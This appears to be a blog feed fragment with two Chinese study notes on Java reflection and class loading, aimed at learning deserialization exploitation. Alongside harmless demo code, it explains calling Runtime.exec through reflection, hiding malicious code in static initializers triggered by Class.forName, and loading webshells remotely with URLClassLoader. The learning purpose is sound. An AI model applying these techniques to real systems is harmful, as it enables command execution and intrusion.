    <content type="html"><![CDATA[<h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><h2 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h2><p>Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性（包括私有的方法和属性）。</p><ol><li>Java反射机制的核心是再程序运行时动态加载类并获取类的详细信息，从而操作类或者对象的属性和方法。本质时JVM得到Class对象进行反编译，从而获取对象的各种信息。</li><li>Java属于先编译再运行的语言，程序中对象的类型再编译期就确定下来了，而当程序再运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以再运行的时候动态创建对象并调用其属性，不需要提前再编译期就知道运行的对象是谁。</li></ol><h2 id="反射常用的类"><a href="#反射常用的类" class="headerlink" title="反射常用的类"></a>反射常用的类</h2><ul><li><code>Java.lang.Class</code>  代表类</li><li><code>Java.lang.reflect.Constructor</code>  代表类的构造方法</li><li><code>Java.lang.reflect.Field</code>  代表类的属性</li><li><code>Java.lang.reflect.Method </code> 代表类的方法</li><li><code>Java.lang.reflect.Modifier </code> 代表类，方法，属性的描述修饰符</li></ul><h2 id="测试练习"><a href="#测试练习" class="headerlink" title="测试练习"></a>测试练习</h2><p><strong>测试类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span> </span>&#123;<br><span class="hljs-comment">//    私有变量</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">private</span> String addr;<br><span class="hljs-comment">//    构造函数</span><br>    People(String name, <span class="hljs-keyword">int</span> age, String addr)&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.age = age;<br>        <span class="hljs-keyword">this</span>.addr = addr;<br>    &#125;<br><span class="hljs-comment">//    设置参数</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAddr</span><span class="hljs-params">(String addr)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.addr = addr;<br>    &#125;<br><span class="hljs-comment">//    获取变量值</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getAddr</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.addr;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getAll</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Name:&quot;</span> + <span class="hljs-keyword">this</span>.name);<br>        System.out.println(<span class="hljs-string">&quot;Age:&quot;</span> + <span class="hljs-keyword">this</span>.age);<br>        System.out.println(<span class="hljs-string">&quot;Addr:&quot;</span> + <span class="hljs-keyword">this</span>.addr);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>创建了一个简单的测试People类</p></blockquote><p><strong>获取到类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException </span>&#123;<br><br>        People p1 = <span class="hljs-keyword">new</span> People(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br><br>        Class p2 = People.class;<br><br>        Class p3 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br><br>        Class p4 = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.People&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;p1:&quot;</span> + p1);<br><br>        System.out.println(<span class="hljs-string">&quot;p2:&quot;</span> + p2);<br><br>        System.out.println(<span class="hljs-string">&quot;p3:&quot;</span> + p3);<br><br>        System.out.println(<span class="hljs-string">&quot;p4:&quot;</span> + p4);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011212404093.png" alt="image-20211011212404093"></p><p>以上四种通过不同的方式都成功创建类People类</p><p>第一种方法直接创建对象，没有使用反射；第二种是利用现有类获取类；第三种是靠写入包路径参数获取到类；第四种就是利用<code>ClassLoader</code> 的方法获取类</p><blockquote><p>上面的方法的区别就是是否会对类初始化</p></blockquote><p><strong>创建实例</strong></p><ol><li><p>直接使用<code>Class</code>对象的<code>newInstance()</code>方法来创建<code>Class</code>对应的实例</p></li><li><p>先通过<code>Class</code>对象获取指定的<code>Constructor</code>对象，再调用<code>Constructor</code>对象的<code>newInstance()</code>创建对象</p><blockquote><p>第一种只能使用默认的无参构造，第二种可以指定类构造器</p></blockquote></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException </span>&#123;<br><span class="hljs-comment">//        获取类</span><br>        Class p1 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br><span class="hljs-comment">//        实例化类</span><br><span class="hljs-comment">//        默认无参构造器(需要类有无参构造函数)</span><br>        People people1 = (People) p1.newInstance();<br><span class="hljs-comment">//        指定类构造器</span><br>        people1.getAll();<br>        System.out.println(<span class="hljs-string">&quot;----------&quot;</span>);<br>        Constructor cons = p1.getDeclaredConstructor(String.class, <span class="hljs-keyword">int</span>.class, String.class);<br>        People people2 = (People) cons.newInstance(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br>        people2.getAll();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011220423307.png" alt="image-20211011220423307"></p><p><code>getConstructors()</code>：所有”公有的”构造方法</p><p><code>getDeclaredConstructors()</code>：获取所有的构造方法(包括私有、受保护、默认、公有)</p><p><strong>获取成员属性并修改</strong></p><p><code>getFileds()</code> 获取类的所有public属性</p><p><code>getDeclaredFileds()</code> 获取类的所有public属性</p><p><code>getFiled(String name)</code>：特定的Public属性</p><p><code>getDeclaredFiled(String name)</code>: 获取类的特定属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException </span>&#123;<br>        Class p1 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br><br>        Constructor cons = p1.getDeclaredConstructor(String.class, <span class="hljs-keyword">int</span>.class, String.class);<br>        People people1 = (People) cons.newInstance(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br>        people1.getAll();<br>        System.out.println(<span class="hljs-string">&quot;--------------&quot;</span>);<br>        Field[] fields = p1.getDeclaredFields();<br>        <span class="hljs-keyword">for</span>(Field f:fields)&#123;<br>            System.out.println(f);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;----------------&quot;</span>);<br>        Field field = p1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(field);<br>        System.out.println(<span class="hljs-string">&quot;------------&quot;</span>);<br><span class="hljs-comment">//        解除私有参数限定</span><br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(people1, <span class="hljs-string">&quot;test&quot;</span>);<br>        people1.getAll();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011222341138.png" alt="image-20211011222341138"></p><blockquote><p>获取单个的类成员变量，依然使用的是前面的数据类型是Filed，修改成员变量的时候，使用set函数，如果是修改私有成员变量需要先使用<code>setAccessible(true)</code>函数，然后使用 <code>set</code> 函数来设置变量的值</p><p>通过反射可以直接修改类的私有成员变量</p></blockquote><p><strong>获取成员方法并调用</strong></p><p><code>getMethods()</code>：获取所有Public成员方法</p><p><code>getDeclaredMethods()</code> ：获取所有成员方法</p><p><code>getMethod()</code> ：获取特定Public成员方法</p><p><code>getDeclaredMethod()</code> ： 获取特定成员方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException </span>&#123;<br>        Class p1 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br>        Constructor cons = p1.getDeclaredConstructor(String.class, <span class="hljs-keyword">int</span>.class, String.class);<br>        People people1 = (People) cons.newInstance(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br>        people1.getAll();<br>        System.out.println(<span class="hljs-string">&quot;-------------&quot;</span>);<br>        Method[] methods = p1.getDeclaredMethods();<br>        <span class="hljs-keyword">for</span>(Method m:methods)&#123;<br>            System.out.println(m);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;-------------&quot;</span>);<br>        Method method = p1.getMethod(<span class="hljs-string">&quot;setAge&quot;</span>, <span class="hljs-keyword">int</span>.class);<br>        method.invoke(people1,<span class="hljs-number">20</span>);<br>        people1.getAll();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011224303903.png" alt="image-20211011224303903"></p><blockquote><p>获取单个类函数时，在其后面加上 参数类型.class ，后面使用invoke调用函数时，参数为实例化类的名字，和函数的参数。如果函数是私有的可以使用<code>setAccessible(true)</code>，解除私有限定</p><p>最后使用 <code>invoke()</code> 来调用函数，第一个参数是所选的类，后面的参数就是给函数传的参数</p><p>这里感觉这个的作用就是拿来调用类中的私有方法</p></blockquote><h2 id="Runtime-类的使用"><a href="#Runtime-类的使用" class="headerlink" title="Runtime 类的使用"></a>Runtime 类的使用</h2><blockquote><p><code>java.lang.Runtime</code> 中有一个 <code>exec</code> 方法可以执行本地命令，所以经常被在各种<code>payload</code>中</p></blockquote><p><code>Runtime</code> 类的构造函数有点特别，它的空构造函数是私有的（在IDEA中可以直接按 F4 查看类源码）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012125858616.png" alt="image-20211012125858616"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012132531112.png" alt="image-20211012132531112"></p><p>所以对于一般的情况，我们需要使用 <code>getRuntime()</code> 函数来实例化这个类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012132929569.png" alt="image-20211012132929569"></p><p>使用反射调用 <code>exec()</code></p><p>第一种方法：调用私有构造函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012134851725.png" alt="image-20211012134851725"></p><p>第二种方法：调用 <code>getRuntime()</code> 函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012135057941.png" alt="image-20211012135057941"></p><blockquote><p><code>getRuntime()</code> 函数的返回一个 Runtime  类</p></blockquote><h2 id="ProcessBuilder类使用"><a href="#ProcessBuilder类使用" class="headerlink" title="ProcessBuilder类使用"></a>ProcessBuilder类使用</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012154708889.png" alt="image-20211012154708889"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012154732739.png" alt="image-20211012154732739"></p><p>根据类的构造方法实例化类，通过<code>start()</code>方法执行命令即可，只需要一个参数就可以了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012155047493.png" alt="image-20211012155047493"></p><h2 id="深度测试"><a href="#深度测试" class="headerlink" title="深度测试"></a>深度测试</h2><p>是否会对类初始化的问题</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012151219874.png" alt="image-20211012151219874"></p><p>在使用 <code>forname()</code> 时，构造函数并不会执行，即使我们设置 <code>initialize=true</code>，这里的初始化指的就是类的初始化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TrainPrint</span> </span>&#123;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;代码块！！！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;静态代码块！！！&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrainPrint</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;构造函数！！！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的 初始化方法的区别，调用顺序，安全上的价值？</p><p>首先调用的是 <code>static&#123;&#125;</code> 其次是 <code>&#123;&#125;</code> 最后是 构造函数</p><p><code>static&#123;&#125;</code> 是类初始化的时候调用，<code>&#123;&#125;</code>中的代码会放在构造函数的 <code>super()</code> 后面，在当前构造函数前面，所以 <code>forName</code> 中的 <code>initialize=true</code> 其实就是告诉 java 虚拟机是否执行类初始化。</p><p>攻击者编写一个恶意类代码放进 <code>static&#123;&#125;</code> 中，就会在执行 <code>forName()</code> 方法的时候自动调用</p><p>……………… 更多待学</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Java 反射机制是 Java 动态性的重要体现，利用反射机制可以对 Java 的类实现动态调用。Java 的大部分框架都是利用反射编写的，利用 Java 的反射在漏洞利用中有重大作用</p><p>学习文章</p><p>P神代码审计牛逼！！！</p><p><a href="https://m0nit0r.top/2020/06/07/java-deserialize-learn2/">https://m0nit0r.top/2020/06/07/java-deserialize-learn2/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java反射机制&quot;&gt;&lt;a href=&quot;#Java反射机制&quot; class=&quot;headerlink&quot; title=&quot;Java反射机制&quot;&gt;&lt;/a&gt;Java反射机制&lt;/h1&gt;&lt;h2 id=&quot;反射机制&quot;&gt;&lt;a href=&quot;#反射机制&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="编程语言" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java类加载</title>
    <link href="http://example.com/2021/10/11/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <id>http://example.com/2021/10/11/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/</id>
    <published>2021-10-11T11:15:55.000Z</published>
    <updated>2021-10-31T15:13:19.065Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java类加载机制"><a href="#Java类加载机制" class="headerlink" title="Java类加载机制"></a>Java类加载机制</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java 程序是由 class 文件组成的一个完整的应用程序，再运行程序时，并不会一次性加载所有的 class 文件进入内存，而是通过 java 的类加载机制进行动态加载，从而转换为 <code>java.lang.Class</code> 的一个实例</p><p>Java 代码需要先编译为 Class 字节码，然后被虚拟机解释执行，把字节码从 Class 文件（或者其他外部来源）加载到内存，并形成可能被 JVM 直接使用得结构数据，这一过程就是类加载</p><p>加载类的过程可以分为：加载、链接（验证 准备 解析）、初始化</p><p>加载===&gt;验证====&gt;准备====&gt;解析====&gt;初始化</p><p>Java 类初始化的时候会调用 <code>java.lang.ClassLoder</code> 加载类字节码，<code>ClassLoader</code> 会调用 JVM 的native方法来定义一个 <code>java.lang.Class</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211007203744816.png" alt="image-20211007203744816"></p><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>这里父类加载器不是通过继承关系来实现的，而是采用组合实现的</p><p>站在JVM虚拟机的角度讲只存在两种类加载器：</p><ul><li>启动类加载器：使用C++实现</li><li>其他类加载器：使用 java 语言实现</li></ul><p>开发人员角度存在三种类加载器：</p><ul><li>根类加载器</li><li>扩展类加载器</li><li>系统类加载器</li></ul><h3 id="根类加载器（Bootstrap）"><a href="#根类加载器（Bootstrap）" class="headerlink" title="根类加载器（Bootstrap）"></a>根类加载器（Bootstrap）</h3><p>根类加载器是最低层得类加载器，是虚拟机得一部分，它是由C++语言实现得，并且没有父类加载器，也没有继承<code>java.lang.ClassLoader</code>类。它主要负责加载由系统属性 <code>sun.boot.class.path</code> 指定得路径下得核心类库。根类加载器只加载<code>java，javax，sun</code>开头的类。</p><h3 id="扩展类加载器（Extension）"><a href="#扩展类加载器（Extension）" class="headerlink" title="扩展类加载器（Extension）"></a>扩展类加载器（Extension）</h3><p><code>ExtClassLoader</code>父加载器是根类加载器</p><h3 id="系统类加载器（System）"><a href="#系统类加载器（System）" class="headerlink" title="系统类加载器（System）"></a>系统类加载器（System）</h3><p><code>AppClassLoader</code> 应用类加载器，默认的类加载器，父类是扩展类加载器。</p><blockquote><p>java虚拟机对class文件采用的是按需加载的方式，当需要使用该类的时候才会把class文件加载到内存生成class对象。</p><p>加载某个类的class文件时，java虚拟机采用的是双亲委派模式，即把加载类的请求交给父加载器处理，是一种任务委派模式。</p></blockquote><h3 id="JVM类加载机制"><a href="#JVM类加载机制" class="headerlink" title="JVM类加载机制"></a>JVM类加载机制</h3><ul><li>全盘负责：当一个类加载器负责加载某个 Class 时，该 Class 所依赖的和引用的其他 Class 也将由该类加载器负责载入，除非显示的使用另外一个类加载器来载入</li><li>父类委托：让父类加载器试图加载该类，只有父类无法完成时才尝试使用自己路径中的加载器</li><li>缓存机制：将所有的加载过的 Class 都缓存，程序使用某个 Class 时，类加载器先从缓存区寻找该类的 Class，只有缓存区不存在时系统才会读取该类的二进制数据，并将其转换成 Class 对象，存入缓存区。</li></ul><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p>加载器比较懒，喜欢把东西交给父类加载，父类加载不了时就会向下委派</p><p>意义：</p><ul><li>系统类防止内存出现多份同样的字节码</li><li>保证 java 程序安全稳定运行</li></ul><h2 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h2><ol><li>命令行启动时由 JVM 初始化加载</li><li>通过 Class.forName() 方法动态加载</li><li>通过 ClassLoader.LoadClass() 方法动态加载</li></ol><blockquote><p>区别就是对于初始化块的处理</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211008011053894.png" alt="image-20211008011053894"></p><h2 id="ClassLoader类"><a href="#ClassLoader类" class="headerlink" title="ClassLoader类"></a>ClassLoader类</h2><blockquote><p>除了根类加载器的所有的类加载器都必须继承<code>java.lang.ClassLoader</code>它是一个抽象类</p></blockquote><p>某些时候我们获取一个类的类加载器时可能会返回一个 null 值，因为 <code>Bootstrap Loader</code>(引导类加载器)是用C语言实现的，找不到一个确定的返回父类Loader的方式，于是就返回NULL</p><p><code>getParent(String name)</code>方法 （返回该类加载器的父类加载器）</p><p><code>loadClass(String name)</code>方法（加载指定的 java 类）</p><p><code>findClass(String name)</code>方法（查找指定的类）</p><p><code>findLoadedClass(String name)</code>方法（查找 JVM 已经加载过的类）</p><p><code>defineClass(String name)</code>方法（ 定义一个java类 ）</p><p><code>resolveClass(String name)</code>方法 （链接指定的 java 类）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20211007235659052.png"></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><blockquote><p>能够从本地或者网络上指定位置加载类</p></blockquote><p>默认父类加载器是系统类加载器，它拥有从远程服务器上加载类的能力，通过 <code>URLClassLoader</code> 可以实现对一些webshell 的远程加载，对某个漏洞的深入利用</p><h2 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h2><p>通常情况下我们会使用系统类加载器，但是有时候会自定义类加载器，比如通过网络传输 java 类的字节码，为了保证安全需要对字节码进行加密处理，这时系统类加载器就无法完成工作。</p><p>一般自定义类加载器的步骤</p><ol><li>继承<code>CLassLoader</code></li><li>重写<code>findClass</code>方法</li></ol><p>需要注意的点：</p><ul><li>最好不要重写 loadClass 方法，这样容易破坏双亲关系</li></ul><p>学习文章</p><p><a href="https://github.com/wangzhiwubigdata/God-Of-BigData/blob/master/JVM/jvm%E7%B3%BB%E5%88%97(%E4%B8%80)java%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.md">https://github.com/wangzhiwubigdata/God-Of-BigData/blob/master/JVM/jvm%E7%B3%BB%E5%88%97(%E4%B8%80)java%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.md</a></p><p><a href="https://zhishihezi.net/endpoint/richtext/4aaa4fe6bc2249252df9ae2b1891b451?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94fb734ea004bf99cfcb44391ec0504f7eddb77ba32acfab113b91e8352187479ffee0ff0fa8ff354b0bc46c4e3e1dc8a97c6b6c515798128245dacf21ddc8d4f5787b19982c9ef340be67e92845cfd034625f6ce4eba9736952a8a40ff54bb957b6e383b20e9b4df48c43718ec6e3ad027c87fd16f9a06d4d6a92ccd81cab45b5fce25b117baa7eae9c2a905abc262fb03">https://zhishihezi.net/endpoint/richtext/4aaa4fe6bc2249252df9ae2b1891b451?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94fb734ea004bf99cfcb44391ec0504f7eddb77ba32acfab113b91e8352187479ffee0ff0fa8ff354b0bc46c4e3e1dc8a97c6b6c515798128245dacf21ddc8d4f5787b19982c9ef340be67e92845cfd034625f6ce4eba9736952a8a40ff54bb957b6e383b20e9b4df48c43718ec6e3ad027c87fd16f9a06d4d6a92ccd81cab45b5fce25b117baa7eae9c2a905abc262fb03</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java类加载机制&quot;&gt;&lt;a href=&quot;#Java类加载机制&quot; class=&quot;headerlink&quot; title=&quot;Java类加载机制&quot;&gt;&lt;/a&gt;Java类加载机制&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="编程语言" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
